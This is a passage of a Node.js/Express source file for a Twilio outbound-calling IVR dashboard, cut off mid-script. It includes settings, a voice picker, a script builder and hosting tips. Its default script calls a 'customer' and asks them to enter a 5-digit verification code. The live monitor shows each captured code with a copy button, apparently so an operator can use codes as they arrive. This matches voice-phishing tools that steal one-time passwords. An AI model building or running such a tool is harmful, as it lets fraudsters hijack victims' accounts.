require("dotenv").config();
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

const SETTINGS_FILE = path.join(__dirname, "settings.json");
const SCRIPT_FILE   = path.join(__dirname, "script.json");

const DEFAULT_SETTINGS = { accountSid:"", authToken:"", fromNumber:"", baseUrl: process.env.BASE_URL || "", voice:"alice", language:"en-US", companyName:"My Company" };
const DEFAULT_SCRIPT = { greeting:{ message:"Hello! Press 1 to continue, or press 2 to end this call.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." }, steps:[{ label:"Verification Code", message:"Please enter your 5-digit verification code, then press hash.", maxDigits:5, timeout:15, confirmMessage:"Thank you. " }], successMessage:"Thank you. Your information has been received. Have a wonderful day. Goodbye.", cancelMessage:"No problem. Your request has been cancelled. Goodbye.", errorMessage:"We did not receive your input. Please call us back. Goodbye." };

function loadSettings(){ try{ if(fs.existsSync(SETTINGS_FILE)) return {...DEFAULT_SETTINGS,...JSON.parse(fs.readFileSync(SETTINGS_FILE))}; }catch(e){} return {...DEFAULT_SETTINGS}; }
function saveSettings(d){ fs.writeFileSync(SETTINGS_FILE,JSON.stringify(d,null,2)); }
function loadScript(){ try{ if(fs.existsSync(SCRIPT_FILE)) return JSON.parse(fs.readFileSync(SCRIPT_FILE)); }catch(e){} return JSON.parse(JSON.stringify(DEFAULT_SCRIPT)); }
function saveScript(d){ fs.writeFileSync(SCRIPT_FILE,JSON.stringify(d,null,2)); }
function makeTwilioClient(){ const s=loadSettings(); if(!s.accountSid||!s.authToken) return null; return require("twilio")(s.accountSid,s.authToken); }

const callSessions = {};

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>IVR Call System</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0d12;--surf:#11141b;--card:#171c26;--border:#1f2535;--border2:#2a3245;
  --green:#10e085;--green-dim:#0a9558;--blue:#4a8ff7;--amber:#f59e1a;
  --red:#f0444a;--purple:#9d7cfa;
  --text:#dde3f0;--text2:#8592ad;--text3:#4e5c78;
  --font:'Outfit',sans-serif;--mono:'JetBrains Mono',monospace;
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font)}
button{font-family:var(--font);cursor:pointer}
input,textarea,select{font-family:var(--font)}

/* ── Shell ── */
.shell{display:flex;height:100vh;overflow:hidden}

/* ── Sidebar ── */
.sidebar{width:300px;min-width:300px;background:var(--surf);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
.logo{padding:22px 20px 16px;border-bottom:1px solid var(--border)}
.logo-mark{display:flex;align-items:center;gap:10px}
.logo-icon{width:32px;height:32px;background:var(--green);border-radius:8px;display:flex;align-items:center;justify-content:center}
.logo-icon svg{width:16px;height:16px}
.logo-name{font-size:17px;font-weight:700;letter-spacing:-0.3px}
.logo-sub{font-size:11px;color:var(--text3);margin-top:2px;letter-spacing:0.5px;text-transform:uppercase}

/* Dialer */
.dialer{padding:18px 20px;border-bottom:1px solid var(--border)}
.section-label{font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);margin-bottom:12px}
.field{margin-bottom:10px}
.field label{display:block;font-size:11px;font-weight:500;color:var(--text2);margin-bottom:5px}
.field input,.field select,.field textarea{
  width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:7px;
  padding:9px 11px;color:var(--text);font-size:13px;outline:none;
  transition:border-color 0.15s
}
.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--green)}
.field input::placeholder{color:var(--text3)}
.btn-call{
  width:100%;padding:11px;background:var(--green);color:#000;border:none;border-radius:8px;
  font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px;
  transition:opacity 0.15s,transform 0.1s;margin-top:4px
}
.btn-call:hover{opacity:0.88}
.btn-call:active{transform:scale(0.98)}
.btn-call:disabled{opacity:0.4;cursor:not-allowed}
.call-msg{margin-top:8px;padding:10px 12px;border-radius:6px;font-size:13px;display:none;font-weight:500;line-height:1.4}
.call-msg.err{background:#f0444a18;border:1px solid #f0444a35;color:var(--red);display:block}
.call-msg.ok{background:#10e08518;border:1px solid #10e08535;color:var(--green);display:block}

/* Stats */
.stats{padding:16px 20px;border-bottom:1px solid var(--border)}
.stat-row{display:flex;justify-content:space-between;margin-bottom:6px}
.stat-item{display:flex;flex-direction:column;align-items:center;flex:1}
.stat-num{font-size:20px;font-weight:700;letter-spacing:-0.5px}
.stat-label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px;margin-top:1px}
.stat-num.green{color:var(--green)}
.stat-num.amber{color:var(--amber)}
.stat-num.blue{color:var(--blue)}

/* Live badge */
.live-pill{
  margin:14px 20px 0;padding:6px 12px;border-radius:20px;
  background:#10e08512;border:1px solid #10e08530;
  display:flex;align-items:center;gap:7px;font-size:11px;color:var(--green)
}
.pulse{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.4;transform:scale(0.85)}}

/* Provider info */
.provider-section{padding:14px 20px;flex:1;overflow-y:auto}
.provider-card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:10px 12px;margin-bottom:8px}
.provider-name{font-size:12px;font-weight:600;color:var(--text)}
.provider-desc{font-size:11px;color:var(--text2);margin-top:2px;line-height:1.4}
.provider-badge{display:inline-block;padding:1px 7px;border-radius:10px;font-size:10px;font-weight:600;margin-left:6px}
.badge-primary{background:#10e08518;color:var(--green)}
.badge-cheap{background:#4a8ff718;color:var(--blue)}
.badge-coming{background:#4e5c7830;color:var(--text3)}

/* ── Main ── */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}

/* Tabs */
.tabbar{display:flex;padding:0 24px;border-bottom:1px solid var(--border);background:var(--surf)}
.tab{
  padding:15px 18px;font-size:13px;font-weight:500;color:var(--text2);
  border:none;background:none;border-bottom:2px solid transparent;
  cursor:pointer;transition:color 0.15s;margin-bottom:-1px
}
.tab:hover{color:var(--text)}
.tab.active{color:var(--green);border-bottom-color:var(--green)}

/* Panels */
.panel{flex:1;overflow-y:auto;display:none;padding:24px}
.panel.active{display:block}

/* Monitor */
.monitor-grid{display:flex;flex-direction:column;gap:14px}
.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:80px 20px;color:var(--text3);text-align:center}
.empty-icon{font-size:40px;margin-bottom:14px;opacity:0.3}
.empty-title{font-size:15px;font-weight:500;color:var(--text2);margin-bottom:6px}
.empty-sub{font-size:13px;line-height:1.6}

/* Call card */
.call-card{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:border-color 0.2s}
.call-card.s-initiated,.call-card.s-ringing{border-color:var(--border2)}
.call-card.s-in-progress{border-color:var(--green-dim);animation:cardGlow 2s ease-in-out infinite}
.call-card.s-completed{border-color:#10e08530}
.call-card.s-cancelled,.call-card.s-failed,.call-card.s-no-answer,.call-card.s-busy{border-color:#f0444a30}
@keyframes cardGlow{0%,100%{box-shadow:0 0 0 0 transparent}50%{box-shadow:0 0 0 3px #10e08510}}

.card-head{padding:14px 18px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid var(--border)}
.card-phone{font-size:18px;font-weight:700;font-family:var(--mono);letter-spacing:0.5px}
.card-meta-label{font-size:11px;color:var(--text2);margin-top:3px}
.card-right{display:flex;flex-direction:column;align-items:flex-end;gap:5px}
.card-time{font-size:11px;color:var(--text3)}

/* Status badge */
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 9px;border-radius:20px;font-size:10px;font-weight:600;letter-spacing:0.3px;text-transform:uppercase}
.badge-initiated{background:#4e5c7825;color:var(--text2)}
.badge-ringing{background:#f59e1a20;color:var(--amber)}
.badge-in-progress{background:#10e08520;color:var(--green)}
.badge-completed{background:#10e08515;color:#0cc070}
.badge-cancelled,.badge-failed,.badge-no-answer,.badge-busy{background:#f0444a18;color:var(--red)}

.badge-dot{width:5px;height:5px;border-radius:50%;background:currentColor}
.badge-dot-pulse{animation:pulse 1.2s infinite}

.card-body{padding:14px 18px}

/* Progress track */
.prog-track{display:flex;gap:5px;margin-bottom:12px;align-items:center}
.prog-seg{height:3px;flex:1;border-radius:2px;background:var(--border2);transition:background 0.3s}
.prog-seg.done{background:var(--green)}
.prog-seg.active{background:var(--blue);animation:segBlink 1s infinite}
@keyframes segBlink{0%,100%{opacity:1}50%{opacity:0.4}}

/* Collected data */
.collected-list{display:flex;flex-direction:column;gap:6px}
.collected-item{display:flex;align-items:center;gap:10px;background:var(--bg);border:1px solid var(--border);border-radius:7px;padding:8px 12px}
.ci-label{font-size:11px;color:var(--text2);flex:1;text-transform:uppercase;letter-spacing:0.5px}
.ci-value{font-family:var(--mono);font-size:15px;font-weight:500;color:var(--green);background:#10e08510;padding:2px 9px;border-radius:5px;letter-spacing:2px}
.ci-time{font-size:10px;color:var(--text3)}

/* Status detail line */
.status-detail{display:flex;align-items:center;gap:7px;font-size:12px;color:var(--text2);margin-top:8px}
.sd-dot{width:6px;height:6px;border-radius:50%;background:var(--amber);flex-shrink:0}
.sd-dot.active{animation:pulse 1s infinite}

/* Copy button */
.card-actions{display:flex;justify-content:flex-end;margin-top:10px}
.btn-copy{background:none;border:1px solid var(--border2);color:var(--text2);border-radius:6px;padding:4px 10px;font-size:11px;cursor:pointer;transition:all 0.15s}
.btn-copy:hover{border-color:var(--green);color:var(--green)}

/* ── Script Builder ── */
.script-section{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px;margin-bottom:16px}
.section-title{font-size:13px;font-weight:600;margin-bottom:14px;color:var(--text)}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.form-full{grid-column:1/-1}
.form-field{display:flex;flex-direction:column;gap:5px}
.form-field label{font-size:11px;font-weight:500;color:var(--text2)}
.form-field input,.form-field select,.form-field textarea{
  background:var(--bg);border:1px solid var(--border2);border-radius:7px;
  padding:9px 11px;color:var(--text);font-size:13px;outline:none;resize:vertical;
  transition:border-color 0.15s
}
.form-field textarea{line-height:1.5;min-height:72px}
.form-field input:focus,.form-field select:focus,.form-field textarea:focus{border-color:var(--green)}
.form-field input::placeholder,.form-field textarea::placeholder{color:var(--text3)}
.form-field select option{background:var(--card)}

/* Step cards */
.step-card{background:var(--bg);border:1px solid var(--border2);border-radius:9px;padding:14px;margin-bottom:10px;position:relative}
.step-header{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.step-num{width:24px;height:24px;border-radius:50%;background:var(--blue);color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-name-input{flex:1;background:transparent;border:none;border-bottom:1px solid var(--border2);color:var(--text);font-size:13px;font-weight:600;padding:2px 0;outline:none}
.step-name-input:focus{border-bottom-color:var(--green)}
.btn-remove{background:none;border:none;color:var(--text3);font-size:18px;cursor:pointer;line-height:1;padding:0 4px;transition:color 0.15s}
.btn-remove:hover{color:var(--red)}
.step-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.step-full{grid-column:1/-1}
.step-field{display:flex;flex-direction:column;gap:4px}
.step-field label{font-size:10px;font-weight:500;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px}
.step-field input,.step-field textarea{
  background:var(--surf);border:1px solid var(--border);border-radius:6px;
  padding:7px 10px;color:var(--text);font-size:12px;outline:none;resize:vertical;
  transition:border-color 0.15s
}
.step-field input:focus,.step-field textarea:focus{border-color:var(--green)}
.step-field input::placeholder,.step-field textarea::placeholder{color:var(--text3)}

.btn-add-step{width:100%;padding:10px;background:none;border:1px dashed var(--border2);border-radius:8px;color:var(--text2);font-size:13px;cursor:pointer;transition:all 0.15s;margin-bottom:4px}
.btn-add-step:hover{border-color:var(--green);color:var(--green);background:#10e08508}

/* Save buttons */
.btn-save{padding:10px 22px;background:var(--green);color:#000;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity 0.15s}
.btn-save:hover{opacity:0.88}
.btn-save:active{transform:scale(0.98)}
.save-row{display:flex;align-items:center;gap:12px;margin-top:16px}
.save-status{font-size:12px;color:var(--green);display:none}
.save-status.visible{display:block}

/* ── Settings ── */
.settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.settings-full{grid-column:1/-1}
.section-divider{grid-column:1/-1;border:none;border-top:1px solid var(--border);margin:4px 0}

/* Voice grid */
.voice-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:8px}
.voice-opt{
  position:relative;padding:10px 12px;background:var(--bg);border:1px solid var(--border2);
  border-radius:8px;cursor:pointer;transition:border-color 0.15s
}
.voice-opt:has(input:checked){border-color:var(--green);background:#10e08508}
.voice-opt input{position:absolute;opacity:0;width:0;height:0}
.voice-opt-name{font-size:12px;font-weight:600;color:var(--text)}
.voice-opt-desc{font-size:10px;color:var(--text2);margin-top:2px}
.voice-opt-tag{font-size:9px;padding:1px 5px;border-radius:3px;margin-top:4px;display:inline-block}
.tag-free{background:#10e08518;color:var(--green)}
.tag-natural{background:#4a8ff718;color:var(--blue)}
.tag-premium{background:#9d7cfa18;color:var(--purple)}

/* Provider cards in settings */
.provider-info{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px;margin-top:8px}
.prov-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid var(--border)}
.prov-row:last-child{border-bottom:none;padding-bottom:0}
.prov-name{font-size:12px;font-weight:600}
.prov-detail{font-size:11px;color:var(--text2);margin-top:1px}
.prov-price{font-size:12px;font-weight:600;color:var(--green);text-align:right}
.prov-sub{font-size:10px;color:var(--text3);margin-top:1px;text-align:right}

/* URL detect */
.url-detect{display:flex;gap:8px}
.btn-detect{padding:9px 12px;background:none;border:1px solid var(--border2);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;white-space:nowrap;transition:all 0.15s}
.btn-detect:hover{border-color:var(--blue);color:var(--blue)}

/* Helper note */
.note{font-size:11px;color:var(--text3);margin-top:5px;line-height:1.4}
.note a{color:var(--blue);text-decoration:none}
.note a:hover{text-decoration:underline}

/* Hosting help section */
.hosting-cards{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:10px}
.host-card{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px}
.host-name{font-size:13px;font-weight:700}
.host-tier{font-size:10px;padding:1px 7px;border-radius:10px;margin-left:6px}
.tier-free{background:#10e08518;color:var(--green)}
.tier-paid{background:#f59e1a18;color:var(--amber)}
.host-desc{font-size:11px;color:var(--text2);margin-top:6px;line-height:1.5}
.host-link{display:inline-block;margin-top:6px;font-size:11px;color:var(--blue);text-decoration:none}
.host-link:hover{text-decoration:underline}
.recommended-banner{font-size:10px;font-weight:600;color:var(--green);letter-spacing:0.5px;text-transform:uppercase;margin-bottom:4px}

/* Scrollbar */
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}

/* Panel header */
.panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.panel-title{font-size:17px;font-weight:700}
.panel-sub{font-size:12px;color:var(--text2);margin-top:2px}
</style>
</head>
<body>
<div class="shell">

<!-- ══ SIDEBAR ══ -->
<aside class="sidebar">
  <div class="logo">
    <div class="logo-mark">
      <div class="logo-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round">
          <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/>
        </svg>
      </div>
      <div>
        <div class="logo-name">IVR System</div>
      </div>
    </div>
    <div class="logo-sub" id="company-label">Loading...</div>
  </div>

  <!-- Dialer -->
  <div class="dialer">
    <div class="section-label">📞 New Call</div>
    <div class="field">
      <label>Customer Phone Number</label>
      <input type="tel" id="phoneInput" placeholder="+1 555 000 0000"/>
    </div>
    <div class="field">
      <label>Note / Label <span style="color:var(--text3)">(optional)</span></label>
      <input type="text" id="labelInput" placeholder="e.g. Invoice #042"/>
    </div>
    <button class="btn-call" id="callBtn" onclick="initiateCall()">
      <span id="callBtnIcon">📲</span>
      <span id="callBtnText">CALL NOW</span>
    </button>
    <div class="call-msg" id="callMsg"></div>
    <button class="btn-test" onclick="testConnection()" style="width:100%;margin-top:8px;padding:8px;background:none;border:1px solid var(--border2);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;" onmouseover="this.style.borderColor='var(--blue)';this.style.color='var(--blue)'" onmouseout="this.style.borderColor='var(--border2)';this.style.color='var(--text2)'">🔍 Test Connection</button>
  </div>

  <!-- Stats -->
  <div class="stats">
    <div class="section-label">Today</div>
    <div class="stat-row">
      <div class="stat-item">
        <div class="stat-num green" id="stat-active">0</div>
        <div class="stat-label">Active</div>
      </div>
      <div class="stat-item">
        <div class="stat-num blue" id="stat-total">0</div>
        <div class="stat-label">Total</div>
      </div>
      <div class="stat-item">
        <div class="stat-num" id="stat-done">0</div>
        <div class="stat-label">Done</div>
      </div>
    </div>
    <div class="live-pill">
      <div class="pulse"></div>
      Live monitoring — updates every 2s
    </div>
  </div>

  <!-- Providers -->
  <div class="provider-section">
    <div class="section-label">Phone Providers</div>
    <div class="provider-card">
      <div class="provider-name">Twilio <span class="provider-badge badge-primary">Recommended</span></div>
      <div class="provider-desc">Most reliable. Easy setup. $1/mo number + ~$0.013/min calls.</div>
    </div>
    <div class="provider-card">
      <div class="provider-name">SignalWire <span class="provider-badge badge-cheap">Cheaper</span></div>
      <div class="provider-desc">Twilio-compatible API. Often 3–5× cheaper per minute. Same code works.</div>
    </div>
    <div class="provider-card">
      <div class="provider-name">Vonage <span class="provider-badge badge-coming">Different API</span></div>
      <div class="provider-desc">Another major provider. Requires code changes to integrate.</div>
    </div>
  </div>
</aside>

<!-- ══ MAIN ══ -->
<main class="main">
  <div class="tabbar">
    <button class="tab active" onclick="switchTab('monitor',this)">📊 Live Monitor</button>
    <button class="tab" onclick="switchTab('script',this)">📋 Script Builder</button>
    <button class="tab" onclick="switchTab('settings',this)">⚙️ Settings</button>
  </div>

  <!-- ── Monitor Panel ── -->
  <div id="panel-monitor" class="panel active">
    <div class="panel-header">
      <div>
        <div class="panel-title">Live Call Monitor</div>
        <div class="panel-sub">All calls appear here in real time as they happen</div>
      </div>
    </div>
    <div id="monitor-grid" class="monitor-grid">
      <div class="empty" id="empty-state">
        <div class="empty-icon">📵</div>
        <div class="empty-title">No calls yet today</div>
        <div class="empty-sub">Enter a number in the sidebar and click Call Now.<br>Everything will appear here live.</div>
      </div>
    </div>
  </div>

  <!-- ── Script Builder Panel ── -->
  <div id="panel-script" class="panel">
    <div class="panel-header">
      <div>
        <div class="panel-title">Script Builder</div>
        <div class="panel-sub">Design exactly what the bot says and what information it collects</div>
      </div>
    </div>

    <!-- Greeting -->
    <div class="script-section">
      <div class="section-title">Step 0 — Opening Greeting</div>
      <div class="form-grid">
        <div class="form-field form-full">
          <label>Greeting Message (what the bot says first)</label>
          <textarea id="s-greeting-msg" rows="3" placeholder="Hello! This is a call from..."></textarea>
        </div>
        <div class="form-field">
          <label>Timeout (seconds before giving up)</label>
          <input type="number" id="s-greeting-timeout" value="10" min="5" max="60"/>
        </div>
        <div class="form-field">
          <label>No Input Message</label>
          <input type="text" id="s-greeting-noinput" placeholder="We did not receive your input. Goodbye."/>
        </div>
      </div>
    </div>

    <!-- Steps -->
    <div class="script-section">
      <div class="section-title">Collection Steps</div>
      <div id="steps-list"></div>
      <button class="btn-add-step" onclick="addStep()">+ Add Another Step</button>
    </div>

    <!-- Completion messages -->
    <div class="script-section">
      <div class="section-title">Completion Messages</div>
      <div class="form-grid">
        <div class="form-field form-full">
          <label>✅ Success Message (all steps done)</label>
          <textarea id="s-success" rows="2" placeholder="Thank you. Your information has been received..."></textarea>
        </div>
        <div class="form-field form-full">
          <label>❌ Cancel Message (caller pressed 2)</label>
          <textarea id="s-cancel" rows="2" placeholder="No problem. Goodbye."></textarea>
        </div>
        <div class="form-field form-full">
          <label>⏱ Timeout Message (no input received)</label>
          <textarea id="s-error" rows="2" placeholder="We did not receive your input..."></textarea>
        </div>
      </div>
    </div>

    <div class="save-row">
      <button class="btn-save" onclick="saveScript()">💾 Save Script</button>
      <span class="save-status" id="script-save-status">✓ Saved!</span>
    </div>
  </div>

  <!-- ── Settings Panel ── -->
  <div id="panel-settings" class="panel">
    <div class="panel-header">
      <div>
        <div class="panel-title">Settings</div>
        <div class="panel-sub">Configure your Twilio credentials, phone number, and voice</div>
      </div>
    </div>

    <!-- Credentials -->
    <div class="script-section">
      <div class="section-title">Company &amp; Twilio Credentials</div>
      <div class="settings-grid">
        <div class="form-field settings-full">
          <label>Company Name (shown in logs)</label>
          <input type="text" id="cfg-company" placeholder="My Company"/>
        </div>
        <hr class="section-divider"/>
        <div class="form-field">
          <label>Twilio Account SID</label>
          <input type="text" id="cfg-sid" placeholder="ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"/>
          <span class="note">From <a href="https://console.twilio.com" target="_blank">console.twilio.com</a> → Dashboard</span>
        </div>
        <div class="form-field">
          <label>Twilio Auth Token</label>
          <input type="password" id="cfg-token" placeholder="Your auth token"/>
          <span class="note">Keep this private. Never share it.</span>
        </div>
        <div class="form-field">
          <label>Your Twilio Phone Number (From)</label>
          <input type="tel" id="cfg-from" placeholder="+15551234567"/>
          <span class="note">The number Twilio will call from. Buy one in the Twilio console (~$1/month)</span>
        </div>
        <div class="form-field">
          <label>Your Server Public URL</label>
          <div class="url-detect">
            <input type="text" id="cfg-baseurl" placeholder="https://your-app.onrender.com"/>
            <button class="btn-detect" onclick="detectUrl()">Auto-detect</button>
          </div>
          <span class="note">Twilio needs this to send responses to your server. Use ngrok for local testing.</span>
        </div>
        <div class="form-field">
          <label>Language</label>
          <select id="cfg-language">
            <option value="en-US">English (US)</option>
            <option value="en-GB">English (UK)</option>
            <option value="en-AU">English (Australia)</option>
            <option value="fr-FR">French</option>
            <option value="de-DE">German</option>
            <option value="es-ES">Spanish (Spain)</option>
            <option value="es-MX">Spanish (Mexico)</option>
            <option value="pt-BR">Portuguese (Brazil)</option>
            <option value="it-IT">Italian</option>
            <option value="ja-JP">Japanese</option>
          </select>
        </div>
      </div>
    </div>

    <!-- Voice Selection -->
    <div class="script-section">
      <div class="section-title">Voice Selection</div>
      <p style="font-size:12px;color:var(--text2);margin-bottom:12px;line-height:1.6">
        Standard voices are free with Twilio. Amazon Polly voices are more natural-sounding and cost slightly more (~$0.004 extra per 100 characters). Choose female or male based on your preference.
      </p>
      <div class="voice-grid" id="voice-grid">
        <!-- Populated by JS -->
      </div>
    </div>

    <div class="save-row">
      <button class="btn-save" onclick="saveSettings()">💾 Save Settings</button>
      <span class="save-status" id="settings-save-status">✓ Saved!</span>
    </div>

    <!-- Hosting Guide -->
    <div class="script-section" style="margin-top:16px">
      <div class="section-title">🌐 Where to Host (Free Options)</div>
      <p style="font-size:12px;color:var(--text2);margin-bottom:12px">Deploy this app online so Twilio can reach it. These are free and take ~5 minutes to set up:</p>
      <div class="hosting-cards">
        <div class="host-card" style="border-color:var(--green-dim)">
          <div class="recommended-banner">★ Best for beginners</div>
          <div class="host-name">Render.com <span class="host-tier tier-free">Free</span></div>
          <div class="host-desc">Upload your code to GitHub → connect Render → it deploys automatically. Gives you a permanent URL like <strong>your-app.onrender.com</strong></div>
          <a class="host-link" href="https://render.com" target="_blank">→ render.com</a>
        </div>
        <div class="host-card">
          <div class="host-name">Railway.app <span class="host-tier tier-free">Free</span></div>
          <div class="host-desc">Very fast to deploy. Connect GitHub, click deploy, get a URL. Slightly faster cold starts than Render.</div>
          <a class="host-link" href="https://railway.app" target="_blank">→ railway.app</a>
        </div>
        <div class="host-card">
          <div class="host-name">ngrok <span class="host-tier tier-free">Local testing</span></div>
          <div class="host-desc">Makes your <code style="font-size:10px">localhost:3000</code> public instantly. Perfect for testing before deploying. Run: <code style="font-size:10px">npx ngrok http 3000</code></div>
          <a class="host-link" href="https://ngrok.com" target="_blank">→ ngrok.com</a>
        </div>
      </div>

      <div style="margin-top:16px">
        <div class="section-title" style="font-size:12px;margin-bottom:8px">Phone Number Providers — Comparison</div>
        <div class="provider-info">
          <div class="prov-row">
            <div><div class="prov-name" style="color:var(--green)">Twilio ★</div><div class="prov-detail">Best support, most reliable, easiest setup</div></div>
            <div><div class="prov-price">~$1/mo number · $0.013/min</div><div class="prov-sub">twilio.com</div></div>
          </div>
          <div class="prov-row">
            <div><div class="prov-name" style="color:var(--blue)">SignalWire</div><div class="prov-detail">Twilio-compatible — same API, just change credentials &amp; URL</div></div>
            <div><div class="prov-price">~$1/mo number · $0.004/min</div><div class="prov-sub">signalwire.com</div></div>
          </div>
          <div class="prov-row">
            <div><div class="prov-name">Vonage (Nexmo)</div><div class="prov-detail">Requires code changes to integrate</div></div>
            <div><div class="prov-price">~$0.69/mo number</div><div class="prov-sub">vonage.com</div></div>
          </div>
        </div>
      </div>
    </div>
  </div>

</main>
</div>

<script>
// ── Voice options ─────────────────────────────────────────────────────────
const VOICES = [
  { id:"alice",         name:"Alice",    desc:"Standard female",    tag:"free",    gender:"F" },
  { id:"woman",         name:"Woman",    desc:"Basic female",       tag:"free",    gender:"F" },
  { id:"man",           name:"Man",      desc:"Basic male",         tag:"free",    gender:"M" },
  { id:"Polly.Joanna",  name:"Joanna",   desc:"US English female",  tag:"natural", gender:"F" },
  { id:"Polly.Matthew", name:"Matthew",  desc:"US English male",    tag:"natural", gender:"M" },
  { id:"Polly.Amy",     name:"Amy",      desc:"British female",     tag:"natural", gender:"F" },
  { id:"Polly.Brian",   name:"Brian",    desc:"British male",       tag:"natural", gender:"M" },
  { id:"Polly.Emma",    name:"Emma",     desc:"British female alt", tag:"natural", gender:"F" },
  { id:"Polly.Salli",   name:"Salli",    desc:"US female neural",   tag:"premium", gender:"F" },
  { id:"Polly.Joey",    name:"Joey",     desc:"US male neural",     tag:"premium", gender:"M" },
  { id:"Polly.Nicole",  name:"Nicole",   desc:"Australian female",  tag:"natural", gender:"F" },
  { id:"Polly.Russell", name:"Russell",  desc:"Australian male",    tag:"natural", gender:"M" },
];

// ── State ─────────────────────────────────────────────────────────────────
let currentSettings = {};
let currentScript = {};
let steps = [];
let sessions = [];

// ── Tab switching ─────────────────────────────────────────────────────────
function switchTab(id, btn) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById('panel-' + id).classList.add('active');
  btn.classList.add('active');
}

// ── Load Settings ─────────────────────────────────────────────────────────
async function loadSettings() {
  try {
    const r = await fetch('/api/settings');
    currentSettings = await r.json();
    document.getElementById('cfg-company').value = currentSettings.companyName || '';
    document.getElementById('cfg-sid').value = currentSettings.accountSid || '';
    document.getElementById('cfg-token').value = currentSettings.authToken || '';
    document.getElementById('cfg-from').value = currentSettings.fromNumber || '';
    document.getElementById('cfg-baseurl').value = currentSettings.baseUrl || '';
    document.getElementById('cfg-language').value = currentSettings.language || 'en-US';
    document.getElementById('company-label').textContent = currentSettings.companyName || 'Not configured';
    renderVoiceGrid(currentSettings.voice || 'alice');
  } catch(e) {}
}

async function saveSettings() {
  const payload = {
    companyName: document.getElementById('cfg-company').value,
    accountSid: document.getElementById('cfg-sid').value,
    authToken: document.getElementById('cfg-token').value,
    fromNumber: document.getElementById('cfg-from').value,
    baseUrl: document.getElementById('cfg-baseurl').value,
    language: document.getElementById('cfg-language').value,
    voice: document.querySelector('input[name="voice"]:checked')?.value || 'alice'
  };
  try {
    await fetch('/api/settings', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
    document.getElementById('company-label').textContent = payload.companyName || 'My Company';
    showSaved('settings-save-status');
  } catch(e) { alert('Save failed.'); }
}

function renderVoiceGrid(selectedVoice) {
  const grid = document.getElementById('voice-grid');
  grid.innerHTML = VOICES.map(v => \`
    <label class="voice-opt">
      <input type="radio" name="voice" value="\${v.id}" \${v.id === selectedVoice ? 'checked' : ''}/>
      <div class="voice-opt-name">\${v.name} <span style="font-size:10px;color:var(--text3)">\${v.gender}</span></div>
      <div class="voice-opt-desc">\${v.desc}</div>
      <span class="voice-opt-tag tag-\${v.tag}">\${v.tag === 'free' ? 'Free' : v.tag === 'natural' ? 'Natural' : 'Neural AI'}</span>
    </label>
  \`).join('');
}

function detectUrl() {
  const url = window.location.origin;
  document.getElementById('cfg-baseurl').value = url;
}

// ── Load & Save Script ─────────────────────────────────────────────────────
async function loadScript() {
  try {
    const r = await fetch('/api/script');
    currentScript = await r.json();
    document.getElementById('s-greeting-msg').value = currentScript.greeting?.message || '';
    document.getElementById('s-greeting-timeout').value = currentScript.greeting?.timeout || 10;
    document.getElementById('s-greeting-noinput').value = currentScript.greeting?.noInputMessage || '';
    document.getElementById('s-success').value = currentScript.successMessage || '';
    document.getElementById('s-cancel').value = currentScript.cancelMessage || '';
    document.getElementById('s-error').value = currentScript.errorMessage || '';
    steps = currentScript.steps ? JSON.parse(JSON.stringify(currentScript.steps)) : [];
    renderSteps();
  } catch(e) {}
}
